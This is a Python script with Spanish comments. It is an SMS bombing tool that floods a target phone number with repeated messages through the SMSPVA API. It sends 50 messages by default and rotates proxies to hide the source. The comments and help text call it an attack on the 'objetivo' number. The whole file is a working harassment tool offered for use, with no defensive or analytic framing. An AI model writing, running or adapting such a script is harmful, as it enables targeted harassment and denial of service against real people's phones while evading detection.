import os
import argparse
import signal
import requests
import time
import random
from dotenv import load_dotenv

# Cargar variables desde el archivo .env
load_dotenv()

# API Key para SMSPVA, cargada desde el .env
SMSPVA_API_KEY = os.getenv('SMSPVA_API_KEY')

# Lista de proxies para la rotación
PROXIES = [
    {'http': 'http://proxy1.com:8080'},
    {'http': 'http://proxy2.com:8080'},
    # Añadir más proxies si es necesario
]

# Función para obtener un proxy aleatorio
def get_random_proxy():
    return random.choice(PROXIES)

# Manejo de la señal de terminación del ataque
def signal_handler(signal, frame):
    print('\n[!] Ataque terminado.')
    os._exit(0)

# Enviar SMS a través de SMSPVA
def send_sms(target, message, count):
    url = f"http://api.smspva.com/?key={SMSPVA_API_KEY}&method=sendSMS&number={target}&text={message}"
    for i in range(count):
        try:
            proxy = get_random_proxy()
            response = requests.get(url, proxies=proxy)
            if response.status_code == 200 and 'success' in response.text:
                print(f"SMS {i+1} enviado con éxito")
            else:
                print(f"Error al enviar SMS {i+1}: {response.json().get('error')}")
        except Exception as e:
            print(f"Error en el envío: {e}")
        time.sleep(0.5)  # Control del tiempo entre mensajes

# Función principal
def main():
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=str, metavar="<phone>", help="Número de teléfono objetivo en formato +123456789")
    parser.add_argument("--message", type=str, metavar="<message>", help="Mensaje para el ataque.")
    parser.add_argument("--count", type=int, default=50, metavar="<count>", help="Número de SMS a enviar.")

    args = parser.parse_args()

    # Envío de los SMS
    send_sms(args.target, args.message, args.count)

if __name__ == '__main__':
    main()
